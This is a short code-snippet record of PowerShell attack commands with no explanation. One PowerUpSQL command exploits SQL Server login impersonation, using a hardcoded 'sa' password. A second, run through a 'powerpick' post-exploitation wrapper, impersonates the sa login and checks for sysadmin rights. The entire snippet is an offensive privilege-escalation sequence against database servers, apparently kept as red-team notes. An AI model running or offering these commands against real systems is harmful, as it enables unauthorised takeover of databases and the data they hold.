---
id: 55be64cb-9d0f-4aaf-b210-2300a26a2bd1
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:20.650023+00:00'
updated_at: '2023-04-10T20:36:41.382795+00:00'
---

# Code Snippet 55be64cb

**Language**: ps1

```ps1
Invoke-SQLAuditPrivImpersonateLogin -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Exploit -Verbose

# impersonate sa account
powerpick Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER(''sysadmin'')" -Verbose -Debug
```
